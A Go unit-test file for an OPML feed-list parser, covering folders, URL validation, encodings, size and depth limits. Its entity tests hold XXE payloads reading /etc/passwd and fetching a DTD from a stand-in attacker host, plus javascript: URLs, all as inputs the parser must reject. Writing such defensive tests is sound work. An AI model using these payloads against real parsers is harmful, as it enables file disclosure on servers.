// SPDX-License-Identifier: GPL-3.0-or-later

package opml_test

import (
	"bytes"
	"errors"
	"reflect"
	"strings"
	"testing"

	"github.com/mwolff44/mw-feed/internal/opml"
)

// wrap puts outlines in a minimal OPML document.
func wrap(outlines string) []byte {
	return []byte(`<?xml version="1.0" encoding="UTF-8"?><opml version="1.0"><head><title>t</title></head><body>` + outlines + `</body></opml>`)
}

func mustParse(t *testing.T, data []byte) opml.Document {
	t.Helper()
	d, err := opml.Parse(data)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	return d
}

func TestParseFeedsAtTheRoot(t *testing.T) {
	d := mustParse(t, wrap(`
		<outline type="rss" title="Blog" text="Blog (text)" description="About things" xmlUrl="https://blog.example/feed.xml" htmlUrl="https://blog.example/"/>
		<outline type="rss" text="Only text" xmlUrl="https://other.example/rss"/>`))

	want := []opml.Feed{
		{Title: "Blog", Description: "About things", XMLURL: "https://blog.example/feed.xml", SiteURL: "https://blog.example/"},
		{Title: "Only text", XMLURL: "https://other.example/rss"},
	}
	if !reflect.DeepEqual(d.Feeds, want) {
		t.Errorf("feeds = %+v\nwant    %+v", d.Feeds, want)
	}
	if len(d.Folders) != 0 || len(d.Rejected) != 0 {
		t.Errorf("folders = %v, rejected = %v; want none", d.Folders, d.Rejected)
	}
}

func titlesOf(d opml.Document) map[string][]string {
	out := map[string][]string{}
	for _, f := range d.Feeds {
		out[f.XMLURL] = f.Folders
	}
	return out
}

func TestParseFoldersNestingAndDuplicates(t *testing.T) {
	d := mustParse(t, wrap(`
		<outline xmlUrl="https://root.example/feed"/>
		<outline text="Tech">
			<outline xmlUrl="https://a.example/feed"/>
			<outline text="Linux">
				<outline xmlUrl="https://b.example/feed"/>
				<outline text="Kernel"><outline xmlUrl="https://c.example/feed"/></outline>
			</outline>
		</outline>
		<outline title="News"><outline xmlUrl="https://a.example/feed" title="Second copy"/></outline>
		<outline text="Empty"/>
		<outline text="Tech"><outline xmlUrl="https://d.example/feed"/></outline>
		<outline><outline xmlUrl="https://e.example/feed"/></outline>`))

	// Every folder once, in order of first appearance, the empty one included.
	if want := []string{"Tech", "Linux", "Kernel", "News", "Empty"}; !reflect.DeepEqual(d.Folders, want) {
		t.Errorf("folders = %v, want %v", d.Folders, want)
	}
	want := map[string][]string{
		"https://root.example/feed": nil,               // no folder
		"https://a.example/feed":    {"Tech", "News"},  // in two folders, listed once
		"https://b.example/feed":    {"Tech", "Linux"}, // nested: every ancestor folder
		"https://c.example/feed":    {"Tech", "Linux", "Kernel"},
		"https://d.example/feed":    {"Tech"}, // a folder title seen twice is one folder
		"https://e.example/feed":    nil,      // an untitled outline is not a folder
	}
	if got := titlesOf(d); !reflect.DeepEqual(got, want) {
		t.Errorf("feed folders = %v\nwant           %v", got, want)
	}
	if len(d.Feeds) != 6 {
		t.Errorf("%d feeds, want 6 (the repeated feed is merged)", len(d.Feeds))
	}
	for _, f := range d.Feeds {
		if f.XMLURL == "https://a.example/feed" && f.Title != "a.example" {
			t.Errorf("the first copy of a repeated feed must win (title = %q, want the host fallback)", f.Title)
		}
	}
}

func TestParseTextFieldsArePlainTextAndTitlesFallBackToTheHost(t *testing.T) {
	d := mustParse(t, wrap(`
		<outline xmlUrl="https://a.example/feed" title="Tom &amp;amp; Jerry &lt;b&gt;fun&lt;/b&gt;" description="  A   long
		   description &lt;i&gt;here&lt;/i&gt; "/>
		<outline xmlUrl="https://feeds.example.org:8080/path/rss.xml"/>
		<outline xmlUrl="https://b.example/feed" title="  " text="From text"/>
		<outline text="  &lt;i&gt;&lt;/i&gt;  "><outline xmlUrl="https://c.example/feed" title="C"/></outline>
		<outline text=" My   &amp;amp; folder "><outline xmlUrl="https://d.example/feed" title="D"/></outline>`))

	byURL := map[string]opml.Feed{}
	for _, f := range d.Feeds {
		byURL[f.XMLURL] = f
	}
	if got := byURL["https://a.example/feed"]; got.Title != "Tom & Jerry fun" || got.Description != "A long description here" {
		t.Errorf("a = title %q, description %q; want plain text", got.Title, got.Description)
	}
	if got := byURL["https://feeds.example.org:8080/path/rss.xml"].Title; got != "feeds.example.org" {
		t.Errorf("fallback title = %q, want the host name without the port", got)
	}
	if got := byURL["https://b.example/feed"].Title; got != "From text" {
		t.Errorf("a blank title falls back to text: %q", got)
	}
	// A title made only of markup is not a folder name: the feed has no folder.
	if got := byURL["https://c.example/feed"].Folders; got != nil {
		t.Errorf("c is in folders %v, want none", got)
	}
	if want := []string{"My & folder"}; !reflect.DeepEqual(d.Folders, want) {
		t.Errorf("folders = %v, want %v", d.Folders, want)
	}
}

func TestParseValidatesURLs(t *testing.T) {
	d := mustParse(t, wrap(`
		<outline xmlUrl="  https://ok.example/feed  " title="Trimmed"/>
		<outline xmlUrl="https://ok.example/feed" title="Same after trimming"/>
		<outline xmlUrl="ftp://bad.example/feed" title="Ftp"/>
		<outline xmlUrl="javascript:alert(1)" text="Script"/>
		<outline xmlUrl="/relative/feed" title="Relative"/>
		<outline xmlUrl="not a url" title="Garbage"/>
		<outline xmlUrl="https://" title="No host"/>
		<outline xmlUrl="https://site.example/feed" title="Bad site" htmlUrl="javascript:alert(1)"/>
		<outline xmlUrl="https://site2.example/feed" title="Relative site" htmlUrl="/home"/>`))

	var urls []string
	for _, f := range d.Feeds {
		urls = append(urls, f.XMLURL)
	}
	if want := []string{"https://ok.example/feed", "https://site.example/feed", "https://site2.example/feed"}; !reflect.DeepEqual(urls, want) {
		t.Errorf("accepted feeds = %v, want %v (trimmed, duplicates merged)", urls, want)
	}
	if d.Feeds[0].Title != "Trimmed" {
		t.Errorf("first copy must win: %q", d.Feeds[0].Title)
	}
	for _, f := range d.Feeds[1:] {
		if f.SiteURL != "" {
			t.Errorf("%s: invalid site URL %q must be dropped, the feed kept", f.XMLURL, f.SiteURL)
		}
	}
	wantRejected := []opml.Rejected{
		{Title: "Ftp", URL: "ftp://bad.example/feed", Reason: opml.ReasonInvalidURL},
		{Title: "Script", URL: "javascript:alert(1)", Reason: opml.ReasonInvalidURL},
		{Title: "Relative", URL: "/relative/feed", Reason: opml.ReasonInvalidURL},
		{Title: "Garbage", URL: "not a url", Reason: opml.ReasonInvalidURL},
		{Title: "No host", URL: "https://", Reason: opml.ReasonInvalidURL},
	}
	if !reflect.DeepEqual(d.Rejected, wantRejected) {
		t.Errorf("rejected = %+v\nwant     %+v", d.Rejected, wantRejected)
	}
}

func TestParseRejectsWhatIsNotAnOPMLFile(t *testing.T) {
	cases := map[string]string{
		"empty":             "",
		"blank":             " \n\t",
		"plain text":        "this is not OPML",
		"HTML page":         "<!doctype html><html><body><p>hi</p></body></html>",
		"another XML":       `<?xml version="1.0"?><rss version="2.0"><channel><title>x</title></channel></rss>`,
		"OPML without body": `<?xml version="1.0"?><opml version="1.0"><head><title>x</title></head></opml>`,
		"truncated":         `<?xml version="1.0"?><opml version="1.0"><body><outline text="a"`,
		"body outside opml": `<?xml version="1.0"?><body><outline xmlUrl="https://a.example/feed"/></body>`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := opml.Parse([]byte(doc)); !errors.Is(err, opml.ErrInvalidFormat) {
				t.Errorf("error = %v, want opml.ErrInvalidFormat", err)
			}
		})
	}
}

func TestParseAcceptsValidFilesWhateverTheirCaseNamespaceOrContent(t *testing.T) {
	cases := map[string]string{
		"no feed, no folder":    string(wrap("")),
		"upper-case names":      `<OPML><BODY><OUTLINE XMLURL="https://a.example/feed" TITLE="A"/></BODY></OPML>`,
		"namespace":             `<opml xmlns="http://opml.org/spec2"><body><outline xmlUrl="https://a.example/feed" title="A"/></body></opml>`,
		"plain DOCTYPE":         `<?xml version="1.0"?><!DOCTYPE opml><opml><body><outline xmlUrl="https://a.example/feed" title="A"/></body></opml>`,
		"lower-case attributes": `<opml><body><outline xmlurl="https://a.example/feed" htmlurl="https://a.example/" title="A"/></body></opml>`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			d, err := opml.Parse([]byte(doc))

			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			wantFeeds := 1
			if name == "no feed, no folder" {
				wantFeeds = 0
			}
			if len(d.Feeds) != wantFeeds {
				t.Errorf("%d feed(s), want %d", len(d.Feeds), wantFeeds)
			}
		})
	}
}

func TestParseRefusesEntityDeclarations(t *testing.T) {
	cases := map[string]string{
		"internal entity":    `<?xml version="1.0"?><!DOCTYPE opml [<!ENTITY x "boom">]><opml><body><outline xmlUrl="https://a.example/feed" title="&x;"/></body></opml>`,
		"external entity":    `<?xml version="1.0"?><!DOCTYPE opml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><opml><body><outline xmlUrl="https://a.example/feed" title="&xxe;"/></body></opml>`,
		"parameter entity":   `<?xml version="1.0"?><!DOCTYPE opml [<!ENTITY % p SYSTEM "http://evil.example/p.dtd">%p;]><opml><body/></opml>`,
		"lower-case keyword": `<?xml version="1.0"?><!DOCTYPE opml [<!entity x "y">]><opml><body/></opml>`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := opml.Parse([]byte(doc)); !errors.Is(err, opml.ErrEntityNotAllowed) {
				t.Errorf("error = %v, want opml.ErrEntityNotAllowed", err)
			}
		})
	}
}

func TestParseLimitsSizeAndDepth(t *testing.T) {
	// Size: refused before anything is parsed.
	big := make([]byte, opml.MaxSize+1)
	copy(big, wrap(""))
	if _, err := opml.Parse(big); !errors.Is(err, opml.ErrTooLarge) {
		t.Errorf("oversized file: error = %v, want opml.ErrTooLarge", err)
	}
	atLimit := append(wrap(""), bytes.Repeat([]byte(" "), opml.MaxSize-len(wrap("")))...)
	if _, err := opml.Parse(atLimit); err != nil {
		t.Errorf("file of exactly the maximum size: %v, want it accepted", err)
	}

	// Depth: 16 levels of outline are fine, 17 are not.
	nest := func(n int) []byte {
		return wrap(strings.Repeat(`<outline text="f">`, n) + `<outline xmlUrl="https://a.example/feed"/>` + strings.Repeat(`</outline>`, n))
	}
	if _, err := opml.Parse(nest(15)); err != nil { // 15 folders + the feed outline = 16 levels
		t.Errorf("16 levels: %v, want accepted", err)
	}
	if _, err := opml.Parse(nest(16)); !errors.Is(err, opml.ErrTooDeep) {
		t.Errorf("17 levels: error = %v, want opml.ErrTooDeep", err)
	}
	if _, err := opml.Parse(nest(5000)); !errors.Is(err, opml.ErrTooDeep) {
		t.Errorf("5000 levels: error = %v, want opml.ErrTooDeep (and no crash)", err)
	}
}

func TestParseReadsDeclaredEncodings(t *testing.T) {
	latin1 := []byte("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><opml><body><outline xmlUrl=\"https://a.example/feed\" title=\"Caf\xe9 \xe0 la cr\xe8me\"/></body></opml>")
	win1252 := []byte("<?xml version=\"1.0\" encoding=\"windows-1252\"?><opml><body><outline xmlUrl=\"https://a.example/feed\" title=\"Prix \x80 \x93quot\xe9\x94\"/></body></opml>")
	for name, tc := range map[string]struct {
		doc  []byte
		want string
	}{
		"ISO-8859-1":   {latin1, "Café à la crème"},
		"windows-1252": {win1252, "Prix € “quoté”"},
	} {
		t.Run(name, func(t *testing.T) {
			d := mustParse(t, tc.doc)

			if len(d.Feeds) != 1 || d.Feeds[0].Title != tc.want {
				t.Errorf("feeds = %+v, want one titled %q", d.Feeds, tc.want)
			}
		})
	}
	unknown := []byte(`<?xml version="1.0" encoding="x-no-such-charset"?><opml><body/></opml>`)
	if _, err := opml.Parse(unknown); !errors.Is(err, opml.ErrUnsupportedEncoding) {
		t.Errorf("unknown encoding: error = %v, want opml.ErrUnsupportedEncoding", err)
	}
}
